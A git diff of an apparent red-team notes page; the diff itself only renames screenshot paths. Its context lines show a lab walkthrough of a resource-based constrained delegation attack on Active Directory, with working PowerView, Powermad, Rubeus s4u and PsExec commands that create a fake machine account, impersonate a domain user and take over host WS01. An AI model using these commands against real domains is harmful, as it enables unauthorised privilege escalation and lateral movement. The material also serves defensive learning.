@@ -38,7 +38,7 @@ Since the attack will entail creating a new computer object on the domain, let's
 Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 20-49-58.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-20-49-58.png)
 
 The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:
 
@@ -46,7 +46,7 @@ The attack also requires the DC to be running at least Windows 2012, so let's ch
 Get-DomainController
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 20-56-15.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-20-56-15.png)
 
 Last thing to check - the target computer `WS01` object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:
 
@@ -54,11 +54,11 @@ Last thing to check - the target computer `WS01` object must not have the attrib
 Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 21-03-32.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-21-03-32.png)
 
 This is the attribute the above command is referring to:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 21-08-47.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-21-08-47.png)
 
 ## Creating a new Computer Object
 
@@ -69,7 +69,7 @@ import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 21-30-46.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-21-30-46.png)
 
 Checking if the computer got created and noting its SID:
 
@@ -78,7 +78,7 @@ Get-DomainComputer fake01
 # computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-28 22-25-11.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-25-11.png)
 
 Create a new raw security descriptor for the `FAKE01` computer principal:
 
@@ -88,7 +88,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-28 22-26-41.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-26-41.png)
 
 ## Modifying Target Computer's AD Object
 
@@ -98,21 +98,21 @@ Applying the security descriptor bytes to the target `WS01` machine:
 Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-38-54.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-38-54.png)
 
 Reminder - we were able to write this because `offense\Sandy` belongs to security group `offense\Operations`, which has full control over the target computer `WS01$` although the only important one/enough is the `WRITE` privilege:
 
 
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-40-43.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-40-43.png)
 
 If our user did not have the required privileges, you could infer that from the verbose error message:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-43-25.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-43-25.png)
 
 Once the `msDS-AllowedToActOnBehalfOfOtherIdentitity` is set, it is visible here:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-42-18.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-42-18.png)
 
 Same can be seen this way:
 
@@ -120,7 +120,7 @@ Same can be seen this way:
 Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-41-34.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-41-34.png)
 
 We can test if the security descriptor assigned to computer `ws01` in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the `fake01$` machine:
 
@@ -130,7 +130,7 @@ We can test if the security descriptor assigned to computer `ws01` in `msds-allo
 
 Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the `fake01$` machine's SID - exactly what we want it to be:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-28 22-24-04.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-24-04.png)
 
 ## Execution
 
@@ -142,7 +142,7 @@ Let's generate the RC4 hash of the password we set for the `FAKE01` computer:
 \\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-46-25.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-22-46-25.png)
 
 ### Impersonation
 
@@ -152,15 +152,15 @@ Once we have the hash, we can now attempt to execute the attack by requesting a 
 \\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 23-40-45.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-45.png)
 
 Unfortunately, in my labs, I was not able to replicate the attack at first, even though according to rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system `ws01`:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-26 23-40-57.png>)
+![](<../../.gitbook/assets/Screenshot from 2019-03-26 23-40-57 (1).png>)
 
 Once again, checking kerberos tickets on the system showed that I had a TGS ticket for `spotless` for the CIFS service at `ws01.offense.local`, but the attack still did not work:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-28 22-01-23.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-01-23.png)
 
 ### Trial and Error
 
@@ -168,7 +168,7 @@ Talking to a couple of folks who had successfully simulated this attack in their
 
 Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of `ws01`:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-31 13-16-17.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-31-13-16-17.png)
 
 ### Computer Take Over
 
@@ -178,11 +178,11 @@ Note, howerver if we request a ticket for SPN `cifs/ws01` - we can now access `C
 \\VBOXSVR\Tools\Rubeus\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-31 13-31-17.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-31-13-31-17.png)
 
 To further prove we have admin rights - we can write a simple file from `ws02` to `ws01` in c:\users\administrator:
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-31 13-36-35.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-31-13-36-35.png)
 
 Additionally, check if we can remotely execute code with our noisy friend psexec:
 
@@ -190,7 +190,7 @@ Additionally, check if we can remotely execute code with our noisy friend psexec
 \\vboxsvr\tools\PsExec.exe \\ws01 cmd
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-31 13-44-20.png>)
+![](../../.gitbook/assets/screenshot-from-2019-03-31-13-44-20.png)
 
 {% hint style="warning" %}
 Note that the `offense\spotless` rights are effective only on the target system - i.e. on the system that delegated (`WS01`) another computer resource (`FAKE01`) to act on the target's (`WS01`) behalf and allow to impersonate any domain user.
